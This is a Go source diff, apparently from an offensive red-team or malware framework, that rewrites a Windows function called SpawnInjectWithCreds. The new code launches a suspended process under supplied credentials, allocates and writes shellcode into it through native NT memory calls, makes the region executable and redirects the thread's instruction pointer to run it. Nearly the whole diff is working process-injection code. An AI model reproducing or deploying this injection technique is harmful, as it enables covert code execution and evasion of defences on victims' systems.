@@ -206,17 +206,30 @@ func SpawnInjectWithCreds(shellcode []byte, args []string) (string, error) {
 	si.ShowWindow = winapi.ShowWindow
 	si.Flags = si.Flags | winapi.STARTF_USESHOWWINDOW
 	pi := &windows.ProcessInformation{}
-	var hToken syscall.Handle
-	ok, err := winapi.LogonUser(userW, domainW, passW, 8, 3, &hToken)
-	if !ok {
-		return "", err
-	}
-	err = windows.CreateProcessAsUser(windows.Token(hToken), nil, binaryArgs, nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, si, pi)
+	err := winapi.CreateProcessWithLogonW(userW, domainW, passW, 1, binaryArgs, winapi.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW, nil, si, pi)
 	if err != nil {
 		return "", err
 	}
-	createdPid := strconv.Itoa(int(pi.ProcessId))
-	threadStart, err := RemoteInjectNoThread(shellcode, createdPid)
+	var flProtect uint32 = windows.PAGE_READWRITE
+	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
+	var shellcodelen uintptr = uintptr(len(shellcode))
+	var lpBaseAddress uintptr = 0
+	var lens uint64 = uint64(len(shellcode))
+	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(uintptr(pi.Process), lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil || lpBaseAddress == 0 {
+		return "", err
+	}
+	var nBytesWritten *uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(pi.Process))
+		return "", err
+	}
+	err = rawapi.NtProtectVirtualMemory(uintptr(pi.Process), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(pi.Process))
+		return "", err
+	}
 	if err != nil {
 		return "", err
 	}
@@ -226,7 +239,7 @@ func SpawnInjectWithCreds(shellcode []byte, args []string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	ctx.Rip = winapi.DWORD64(threadStart)
+	ctx.Rip = winapi.DWORD64(lpBaseAddress)
 	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
 		return "", err
@@ -240,7 +253,7 @@ func SpawnInjectWithCreds(shellcode []byte, args []string) (string, error) {
 		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
 		windows.TerminateProcess(pi.Process, 0)
 	}()
-	return fmt.Sprintf("[+] Success Created PID %s", createdPid), nil
+	return fmt.Sprintf("[+] Success Created PID %d", pi.ProcessId), nil
 }
 
 func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (string, error) {
